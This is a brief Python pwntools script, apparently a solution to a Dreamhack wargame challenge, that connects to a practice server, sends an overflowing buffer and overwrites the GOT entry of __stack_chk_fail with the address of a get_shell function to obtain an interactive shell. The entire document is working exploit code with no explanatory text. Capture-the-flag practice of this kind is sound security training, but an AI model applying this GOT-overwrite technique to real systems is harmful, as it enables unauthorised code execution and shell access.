from pwn import *

p=remote("host3.dreamhack.games",18249)

get_shell=0x4008ea

got_stack_chk_fail=0x601020

leak=b"A"*0x50

p.sendline(leak)

p.sendlineafter("Addr : ",str(int(got_stack_chk_fail)))
p.sendlineafter("Value : ",str(int(get_shell)))

p.interactive()